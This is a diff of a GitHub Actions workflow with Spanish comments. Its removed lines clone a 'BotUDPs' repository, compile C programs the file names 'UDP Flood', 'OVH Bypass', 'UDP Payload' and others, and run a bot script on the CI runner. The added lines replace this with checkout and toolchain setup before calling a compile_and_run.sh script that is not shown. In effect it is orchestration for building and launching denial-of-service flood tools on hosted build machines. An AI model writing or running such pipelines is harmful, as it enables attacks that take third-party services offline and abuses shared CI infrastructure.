@@ -1,143 +1,27 @@
-name: pitoajhaushe
+name: jkgsoa8uenf
 
 on:
   workflow_dispatch:
 
 jobs:
-  clone-compile-run:
+  build-and-run:
     runs-on: ubuntu-latest
 
     steps:
-    - name: 🗑️ Limpiar directorio anterior
-      run: |
-        echo "Limpiando directorios anteriores..."
-        rm -rf BotUDPs 2>/dev/null || true
+      - name: 📥 Checkout del código
+        uses: actions/checkout@v3
 
-    - name: 📥 Clonar repositorio CON VERIFICACIÓN
-      run: |
-        echo "Iniciando clonado del repositorio..."
-        if git clone --verbose https://github.com/zJonch14/BotUDPs.git 2>&1; then
-          echo "✅ Repositorio clonado exitosamente en BotUDPs/"
-        else
-          echo "❌ Error en el clonado inicial. Probando clonado superficial (shallow clone)..."
-          if git clone --depth=1 https://github.com/zJonch14/BotUDPs.git 2>&1; then
-            echo "✅ Repositorio clonado (shallow) exitosamente."
-          else
-            echo "❌❌ Error crítico: No se pudo clonar el repositorio."
-            echo "Verifica:"
-            echo "1. Que la URL 'https://github.com/zJonch14/BotUDPs.git' sea correcta."
-            echo "2. Que el repositorio exista y sea público."
-            echo "3. Tu conexión a internet."
-            exit 1
-          fi
-        fi
+      - name: 🐍 Configurar Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
 
-    - name: 📋 VERIFICAR que el clonado funcionó
-      run: |
-        echo "Verificando contenido del directorio clonado..."
-        if [ -d "BotUDPs" ]; then
-          cd BotUDPs
-          echo "✅ Directorio 'BotUDPs' encontrado."
-          echo "Contenido inicial:"
-          ls -la
-          if [ -f "bot.py" ]; then
-            echo "✅ Archivo crítico 'bot.py' encontrado."
-          else
-            echo "❌ ERROR: El archivo 'bot.py' NO está en el repositorio clonado."
-            echo "El repositorio podría estar vacío o tener una estructura diferente."
-            exit 1
-          fi
-          cd ..
-        else
-          echo "❌ ERROR CRÍTICO: El directorio 'BotUDPs' no se creó. El clonado falló."
-          exit 1
-        fi
+      - name: ⚙️ Configurar Go
+        uses: actions/setup-go@v3
+        with:
+          go-version: '1.21' # O la versión que necesites
 
-    - name: 🐍 Configurar Python
-      uses: actions/setup-python@v4
-      with:
-        python-version: '3.11'
-
-    - name: 📦 Instalar dependencias
-      run: |
-        echo "Instalando dependencias..."
-        cd BotUDPs
-        python -m pip install --upgrade pip
-        pip install -r requirements.txt
-        cd ..
-
-    - name: 🔨 Compilar binarios C
-      run: |
-        echo "========================================"
-        echo "COMPILANDO TODOS LOS BINARIOS C"
-        echo "========================================"
-
-        # Crear lista de métodos C a compilar
-        declare -A c_programs=(
-          ["udp.c"]="UDP Flood"
-          ["udphex.c"]="UDPHEX"
-          ["udppps.c"]="UDPPPS"
-          ["ovh.c"]="OVH Bypass"
-          ["udppayload.c"]="UDP Payload"
-        )
-
-        compiled=0
-        failed=0
-
-        cd BotUDPs # Entrar al directorio antes de compilar
-
-        for source_file in "${!c_programs[@]}"; do
-          echo ""
-          echo "🔨 ${c_programs[$source_file]} ($source_file)"
-          if [ -f "$source_file" ]; then
-            binary="${source_file%.c}"
-
-            # Compilar según el tipo de archivo
-            if [ "$source_file" == "ovh.c" ]; then
-              # OVH necesita libpcap
-              gcc -O3 -pthread "$source_file" -o "$binary" -lpcap 2>/dev/null
-            else
-              # Otros métodos
-              gcc -O3 -pthread "$source_file" -o "$binary" 2>/dev/null
-            fi
-
-            if [ -f "$binary" ]; then
-              chmod +x "$binary"
-              echo " ✅ $binary compilado exitosamente"
-              ((compiled++))
-            else
-              echo " ❌ Error compilando $binary"
-              ((failed++))
-            fi
-          else
-            echo " ❌ $source_file no encontrado"
-            ((failed++))
-          fi
-        done
-
-        echo ""
-        echo "========================================"
-        echo "RESULTADO COMPILACIÓN:"
-        echo " ✅ $compiled compilados correctamente"
-        echo " ❌ $failed con errores"
-        echo ""
-
-        # Imprimir la lista de ejecutables de forma segura
-        echo "EJECUTABLES DISPONIBLES:"
-        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" -print0 | while IFS= read -r -d $'\0' file; do
-          base=$(basename "$file")
-          echo "   - $base"
-        done
-        if [ "$compiled" -eq 0 ]; then
-            echo "   Ninguno"
-        fi
-
-        echo "========================================"
-
-        cd .. # Salir del directorio después de compilar y listar
-    - name: ▶️ Ejecutar Bot UDP
-      run: |
-        echo "Ejecutando Bot UDP..."
-        cd BotUDPs
-        python bot.py
-        cd ..
+      - name: 🚀 Ejecutar script de compilación y ejecución
+        run: |
+          chmod +x compile_and_run.sh  # Asegurar que el script es ejecutable
+          ./compile_and_run.sh
